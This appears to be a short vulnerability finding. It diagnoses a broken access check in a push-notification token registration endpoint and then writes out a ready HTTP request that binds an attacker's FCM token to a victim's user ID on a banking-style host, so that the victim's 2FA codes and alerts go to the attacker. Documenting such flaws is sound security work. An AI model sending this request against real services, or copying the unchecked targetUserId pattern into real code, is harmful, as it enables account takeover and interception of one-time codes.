diagnosis: The device registration handler stores FCM push notification tokens against targetUserId provided in the request body instead of req.user.id. An attacker can bind their own device token to a victim's user ID, causing Firebase to send all future push notifications (including one-time 2FA codes, account login alerts, and private message previews) directly to the attacker's phone.
exploit_request:
POST /api/devices/fcm-token HTTP/1.1
Host: mobile.banksecure.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"fcmToken": "fcm_token_attacker_android_phone_xyz99", "targetUserId": "usr_victim_account_executive_10", "devicePlatform": "ANDROID"}
